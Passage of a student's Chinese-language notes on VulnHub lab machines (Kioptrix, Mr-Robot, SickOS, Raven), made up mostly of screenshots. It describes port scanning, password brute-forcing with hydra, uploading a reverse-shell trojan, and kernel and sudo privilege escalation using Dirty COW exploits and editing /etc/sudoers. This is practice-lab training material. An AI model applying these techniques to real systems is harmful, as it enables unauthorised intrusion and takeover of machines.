+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image111.png"
+style="width:5.76042in;height:1.28429in" alt="截图.png" /></p>
+<p>连接成功开始提权</p>
+<p>查看内核发现符合脏牛的特征</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image112.png"
+style="width:3.16667in;height:0.60417in" alt="截图.png" /></p>
+<p>搜索提权文件提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image113.png"
+style="width:5.76042in;height:1.19563in" alt="截图.png" /></p>
+<p>这两个是我最爱用的两个</p>
+<p>使用40616.c提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image114.png"
+style="width:4.70833in;height:1.51042in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image115.png"
+style="width:3.83333in;height:2.63542in" alt="截图.png" /></p>
+<p><strong><mark>Kioptrix: Level 1（mod_ssl &lt;
+2.8.7）</mark></strong></p>
+<p>漏洞探测使用nmap进行半开放全端口扫描靶机，发现开启了，22,80,443，和一个可疑端口初步分析可能又是网址渗透ssh然后登录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image116.png"
+style="width:5.76042in;height:2.12226in" alt="截图.png" /></p>
+<p>试试nc -lvn 查看1024端口的消息</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image117.png"
+style="width:5.19444in;height:2.23215in" alt="截图.png" /></p>
+<p>并无收获</p>
+<p>开始对网页信息探索</p>
+<p>使用nikto发现test.php</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image118.png"
+style="width:5.76042in;height:2.03745in" alt="截图.png" /></p>
+<p>80端口吗发现发现可以子目录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image119.png"
+style="width:5.55556in;height:6.14968in" alt="截图.png" /></p>
+<p>443目录页没任何信息估计是什么插件渗透其中中国mod_ssl很可疑使用searchsploit
+查看发现21617.c比较符合</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image120.png"
+style="width:5.76042in;height:0.77509in" alt="截图.png" /></p>
+<p>这个使用kali自带的还不行需要自己去下载才能编译使用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image121.png"
+style="width:3.86111in;height:1.35295in" alt="截图.png" /></p>
+<p>使用的时候需要对应版本去使用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image122.png"
+style="width:5.76042in;height:3.38199in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image123.png"
+style="width:5.05556in;height:0.16678in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image124.png"
+style="width:4.25in;height:0.375in" alt="截图.png" /></p>
+<p>使用0x6b</p>
+<p>提权成功（修改密码完事）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image125.png"
+style="width:5.76042in;height:5.62778in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image126.png"
+style="width:5.76042in;height:1.40565in" alt="截图.png" /></p>
+<p>或者使用msfconsole自带的模块攻击</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image127.png"
+style="width:5.76042in;height:2.75459in" alt="截图.png" /></p>
+<p><strong>MR-ROBOT: 1（hydra爆破网站用户）</strong></p>
+<p>信息搜集：使用nmap扫服务端口<a
+href="https://twitter.com/home/?status=I%27m%20looking%20at%20Mr-Robot%3A%201%20(https%3A%2F%2Fwww.vulnhub.com%2Fentry%2Fmr-robot-1,151/%3Fsource%3Dtwitter)%20%23VulnHub">发现又是常配的几个端口</a></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image128.png"
+style="width:5.76042in;height:3.84978in" alt="截图.png" /></p>
+<p>使用nikto发现又wordpress框架</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image129.png"
+style="width:5.76042in;height:5.95243in" alt="截图.png" /></p>
+<p>使用弱密码登录不成功，再使用wpsacn扫用户</p>
+<p>扫到robots.txt</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image130.png"
+style="width:5.125in;height:0.78125in" alt="截图.png" /></p>
+<p>访问发现有文章可以做</p>
+<p>dic有可能是爆破的用户名或密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image131.png"
+style="width:5.76042in;height:1.63127in" alt="截图.png" /></p>
+<p>果然下载后是密码也可能是用户名</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image132.png"
+style="width:2.93056in;height:3.94217in" alt="截图.png" /></p>
+<p>但是这个txt就可能是md5，使用john爆破</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image133.png"
+style="width:5.76042in;height:1.34859in" alt="截图.png" /></p>
+<p>也有可能这个是密码</p>
+<p>而那个dic是用户名的爆破</p>
+<p>下载下来试试爆破</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image134.png"
+style="width:5.76042in;height:0.58212in" alt="截图.png" /></p>
+<p>百度是说dic及时用户名也是密码</p>
+<p>所以就要进行爆破用户名才可以更快做到爆破密码</p>
+<p>使用hydra爆破用户名</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image135.png"
+style="width:5.76042in;height:1.2624in" alt="截图.png" /></p>
+<p>然后爆破密码</p>
+<p>爆破成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image136.png"
+style="width:3.81944in;height:0.60362in" alt="截图.png" /></p>
+<p>上传木马反弹shell</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image137.png"
+style="width:5.76042in;height:2.93925in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image138.png"
+style="width:5.76042in;height:0.79615in" alt="截图.png" /></p>
+<p>查看可用文件发现nmap提权文件</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image139.png"
+style="width:4.76389in;height:2.68946in" alt="截图.png" /></p>
+<p>正好msfconsole有提权的模板</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image140.png"
+style="width:5.55556in;height:1.32374in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image141.png"
+style="width:4.36111in;height:2.19099in" alt="截图.png" /></p>
+<p>nmap提权失败</p>
+<p>查看内核提权试试</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image142.png"
+style="width:5.76042in;height:1.6154in" alt="截图.png" /></p>
+<p>提权失败</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image143.png"
+style="width:4.54167in;height:2.63542in" alt="截图.png" /></p>
+<p>使用脏牛提权成功（但是电脑会嘎）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image144.png"
+style="width:4.73611in;height:4.90302in" alt="截图.png" /></p>
+<p>其实nmap可以提权不过我方式有问题</p>
+<p>sudo nmap用不了</p>
+<p>使用脚本的方式也不行</p>
+<p>只能使用绝对路径了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image145.png"
+style="width:4.81944in;height:1.43647in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image146.png"
+style="width:5.75in;height:1.11458in" alt="截图.png" /></p>
+<p><strong>KIOPTRIX: LEVEL 1.2 （CMS框架渗透）</strong></p>
+<p>信息收集：使用nmap扫全端口发现又是经典的20和80</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image147.png"
+style="width:5.18056in;height:2.16812in" alt="截图.png" /></p>
+<p>扫服务漏洞也没发现什么</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image148.png"
+style="width:5.76042in;height:2.74568in" alt="截图.png" /></p>
+<p>对网站进行信息收集发现有phpmyadmin，说明可能有sql注入然后登录数据库什么的</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image149.png"
+style="width:5.16667in;height:1.60417in" alt="截图.png" /></p>
+<p>看这个版本有点老试试看有没有版本漏洞</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image150.png"
+style="width:5.76042in;height:2.765in" alt="截图.png" /></p>
+<p>版本漏洞也没发现什么</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image151.png"
+style="width:5.56944in;height:2.89945in" alt="截图.png" /></p>
+<p>还是扫描子目录试试看有没有好东西</p>
+<p>发现登录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image152.png"
+style="width:5.76042in;height:2.83236in" alt="截图.png" /></p>
+<p>日志文件发现</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image153.png"
+style="width:5.76042in;height:3.43707in" alt="截图.png" /></p>
+<p>发现目录浏览搜索敏感文件，密码用户什么的</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image154.png"
+style="width:5.76042in;height:3.79129in" alt="截图.png" /></p>
+<p>还是一无所获百度学习<mark>此处搭建的像是一个CMS，使用whatweb进行探测，看此网站具体为什么CMS</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image155.png"
+style="width:5.76042in;height:1.90742in" alt="截图.png" /></p>
+<p><mark>试试漏洞 uri 设置为 /</mark> set uri /</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image156.png"
+style="width:5.76042in;height:2.20302in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image157.png"
+style="width:4.56944in;height:0.98066in" alt="截图.png" /></p>
+<p><mark>渗透不成功改一个payload
+才行（比赛对于陌生的模块playload就要多改）</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image158.png"
+style="width:5.76042in;height:1.42608in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image159.png"
+style="width:5.76042in;height:1.3082in" alt="截图.png" /></p>
+<p><mark>查看/etc/passwd看看有没有bash用户如果有说明是要找密码之类的进行ssh登录提权</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image160.png"
+style="width:5.31944in;height:0.68705in" alt="截图.png" /></p>
+<p>但是ssh登录都不行</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image161.png"
+style="width:5.76042in;height:0.73875in" alt="截图.png" /></p>
+<p><mark>内核查看</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image162.png"
+style="width:3.125in;height:1.45833in" alt="截图.png" /></p>
+<p><mark>使用wget下载提权文件</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image163.png"
+style="width:5.76042in;height:1.49756in" alt="截图.png" /></p>
+<p><mark>40616.c内核提权失败</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image164.png"
+style="width:3.90278in;height:1.79007in" alt="截图.png" /></p>
+<p>试试40389.c</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image165.png"
+style="width:5.76042in;height:2.27146in" alt="截图.png" /></p>
+<p>提权成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image166.png"
+style="width:5.22222in;height:1.39676in" alt="截图.png" /></p>
+<p><mark>只能看看是否有数据库的密码和用户登录之类的</mark></p>
+<p><mark>快速查看敏感目录</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image167.png"
+style="width:5.76042in;height:1.84959in" alt="截图.png" /></p>
+<p><mark>发现mysql的登录密</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image168.png"
+style="width:5.13889in;height:1.09449in" alt="截图.png" /></p>
+<p><mark>码</mark></p>
+<p><mark>找半天才发现可疑目录发现有密码爆破出来</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image169.png"
+style="width:5.76042in;height:3.33125in" alt="截图.png" /></p>
+<p><mark>网站爆破</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image170.png"
+style="width:5.76042in;height:2.32821in" alt="截图.png" /></p>
+<p><mark>登录用户</mark></p>
+<p><mark>发现ht sudo提权</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image171.png"
+style="width:5.76042in;height:3.12735in" alt="截图.png" /></p>
+<p><mark>ht提权用起来比较麻烦</mark></p>
+<p><mark>但是还是要学</mark></p>
+<p>测试第一个就登录成功，先看下权限，在看看有么有办法提权，如果不行，再尝试第二个账号。</p>
+<p>尝试了ping命令suid提权，没有成功...</p>
+<p>测试第二个账号看看</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image172.png"
+style="width:5.76042in;height:3.19307in" alt="截图.png" /></p>
+<p>登录成功，发家目录下有两个文件，查看一下，根据文件提示，我们这个账号可能拥有sudo权限</p>
+<p>loneferret@Kioptrix3:~$ head /etc/sudoers</p>
+<p>head: cannot open `/etc/sudoers' for reading: Permission denied</p>
+<p>尝试查看/etc/sudoers 文件，发现没有权限，根据文件提示，sudo ht</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image173.png"
+style="width:5.48611in;height:0.88654in" alt="截图.png" /></p>
+<p>发现报错，提示</p>
+<p>Error opening terminal: xterm-256color.</p>
+<p>通过搜索并尝试找到了解决方法：</p>
+<p>使用export TERM=xterm-color，解决成功</p>
+<p>sudo ht之后打开了这个界面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image174.png"
+style="width:5.76042in;height:3.02586in" alt="截图.png" /></p>
+<p>这是以root权限进入了一个文本编辑器，我们使用它按F3打开/etc/sudoers</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image175.png"
+style="width:5.76042in;height:3.43974in" alt="截图.png" /></p>
+<p>给当前账号加上以root用户执行/bin/bash的权限。</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image176.png"
+style="width:5.76042in;height:1.93247in" alt="截图.png" /></p>
+<p>按F2保存</p>
+<p>然后使用sudo /bin/bash</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image177.png"
+style="width:4.06944in;height:0.95752in" alt="截图.png" /></p>
+<p>可以看到我们现在已经拿到了root权限</p>
+<p><strong>SICKOS: 1.1(网络代理)</strong></p>
+<p>信息收集；使用nmap扫发现开了三个端口</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image178.png"
+style="width:5.47222in;height:2.72048in" alt="截图.png" /></p>
+<p>只有3128能访问</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image179.png"
+style="width:5.76042in;height:4.94897in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image180.png"
+style="width:5.76042in;height:1.8663in" alt="截图.png" /></p>
+<p><mark>分析可能是cms框架漏洞</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image181.png"
+style="width:5.76042in;height:0.94301in" alt="截图.png" /></p>
+<p><mark>渗透失败</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image182.png"
+style="width:5.76042in;height:2.81598in" alt="截图.png" /></p>
+<p><mark>看百度说是</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image183.png"
+style="width:5.76042in;height:4.09597in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image184.png"
+style="width:5.76042in;height:1.85492in" alt="截图.png" /></p>
+<p><mark>要设置代理才能正常访问网页</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image185.png"
+style="width:5.76042in;height:2.35653in" alt="截图.png" /></p>
+<p><mark>就连nikto也要代理扫</mark></p>
+<p><mark>描</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image186.png"
+style="width:5.76042in;height:3.72414in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image187.png"
+style="width:5.76042in;height:4.86945in" alt="截图.png" /></p>
+<p><mark>设置hosts应该才可以访问</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image188.png"
+style="width:5.76042in;height:2.9109in" alt="截图.png" /></p>
+<p><mark>只能百度后台登录界面了</mark></p>
+<p><mark>扫不出</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image189.png"
+style="width:5.76042in;height:2.11585in" alt="截图.png" /></p>
+<p><mark>使用弱密码登录成功</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image190.png"
+style="width:5.76042in;height:3.44613in" alt="截图.png" /></p>
+<p><mark>发现上传点</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image191.png"
+style="width:5.76042in;height:1.84439in" alt="截图.png" /></p>
+<p>上传成功反弹</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image192.png"
+style="width:5.76042in;height:3.10459in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image193.png"
+style="width:5.76042in;height:1.02624in" alt="截图.png" /></p>
+<p><mark>后渗透提权</mark></p>
+<p><mark>发现有wget可以上传提权文件</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image194.png"
+style="width:3.5in;height:1.03125in" alt="截图.png" /></p>
+<p><mark>查看bash用户发现真有</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image195.png"
+style="width:4.44444in;height:0.64533in" alt="截图.png" /></p>
+<p><mark>搜索config.php文件有几率就是那个数据库的用户密码</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image196.png"
+style="width:5.44444in;height:2.78989in" alt="截图.png" /></p>
+<p><mark>不知道为什么使用root数据库密码登录成功了这个bash用户</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image197.png"
+style="width:5.76042in;height:3.53458in" alt="截图.png" /></p>
+<p><mark>sudo su提权成功</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image198.png"
+style="width:3.75in;height:0.9375in" alt="截图.png" /></p>
+<p><strong>SICKOS: 1.2</strong></p>
+<p>信息收集：使用nmap查看开放22，和80又是挑战我web的时候</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image199.png"
+style="width:5.76042in;height:2.20072in" alt="截图.png" /></p>
+<p>扫服务感觉这个有问题可能有版本漏洞之类的</p>
+<p>似乎并没有漏洞</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image200.png"
+style="width:5.76042in;height:1.88768in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image201.png"
+style="width:5.76042in;height:1.87633in" alt="截图.png" /></p>
+<p>先nikto试试水并没有发现什么</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image202.png"
+style="width:5.76042in;height:2.51789in" alt="截图.png" /></p>
+<p>发现有给test目录可疑可能是什么协议可以任意上传之类的</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image203.png"
+style="width:5.36111in;height:4.80831in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image204.png"
+style="width:5.76042in;height:2.74462in" alt="截图.png" /></p>
+<p>使用nmap扫test协议</p>
+<p>nmap --script http-methods --script-args
+http-methods.url-path='/test' 111.111.111.129</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image205.png"
+style="width:5.76042in;height:2.20816in" alt="截图.png" /></p>
+<p>果然有PUT,使用burp抓包上传文件</p>
+<p>一次成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image206.png"
+style="width:5.76042in;height:2.26651in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image207.png"
+style="width:5.76042in;height:2.67107in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image208.png"
+style="width:5.76042in;height:1.99679in" alt="截图.png" /></p>
+<p>渗透提权</p>
+<p>发现bash用户说明需要找到密码之类的登录提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image209.png"
+style="width:4.11111in;height:0.71814in" alt="截图.png" /></p>
+<p><strong>RAVEN: 1（python的sudo提权）</strong></p>
+<p>靶机有4个flag</p>
+<p>信息收集：使用nmap扫描全端口发现有高端口40876</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image210.png"
+style="width:5.76042in;height:2.39523in" alt="截图.png" /></p>
+<p>不是后门</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image211.png"
+style="width:2.79167in;height:0.9375in" alt="截图.png" /></p>
+<p>又发现wordpress</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image212.png"
+style="width:5.66667in;height:1.38542in" alt="截图.png" /></p>
+<p>应该要改hosts果然可以看了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image213.png"
+style="width:4.875in;height:1.67708in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image214.png"
+style="width:5.76042in;height:3.07113in" alt="截图.png" /></p>
+<p>wpscan发现用户</p>
+<p>wpscan --url <a href="http://raven.local/">http://raven.local/</a> -e
+u</p>
+<p>发现两个用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image215.png"
+style="width:5.76042in;height:2.82938in" alt="截图.png" /></p>
+<p> 使用cewl生产密码爆破失败</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image216.png"
+style="width:5.76042in;height:1.80912in" alt="截图.png" /></p>
+<p>只能再试试kali自带的密码本了</p>
+<p>使用老burp扫目录搜索flag</p>
+<p>发现server.html</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image217.png"
+style="width:5.76042in;height:4.09659in" alt="截图.png" /></p>
+<p> 得到flag1</p>
+<p>爆破ssh，没想到这是爆破ssh不是爆破后台，要灵活运用才行啊，</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image218.png"
+style="width:5.76042in;height:2.48531in" alt="截图.png" /></p>
+<p>爆破wordpress后台不超过就只能爆破ssh了</p>
+<p> 查看bash用户发现只有自己</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image219.png"
+style="width:5.43056in;height:0.87556in" alt="截图.png" /></p>
+<p>说明就是现在用户提权</p>
+<p>上传40616.c</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image220.png"
+style="width:5.76042in;height:0.34674in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image221.png"
+style="width:3.98611in;height:1.73807in" alt="截图.png" /></p>
+<p>脏牛提权失败试试其他的方法</p>
+<p>百度说是要看清楚用户发现有一个sh用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image222.png"
+style="width:4.68056in;height:1.16753in" alt="截图.png" /></p>
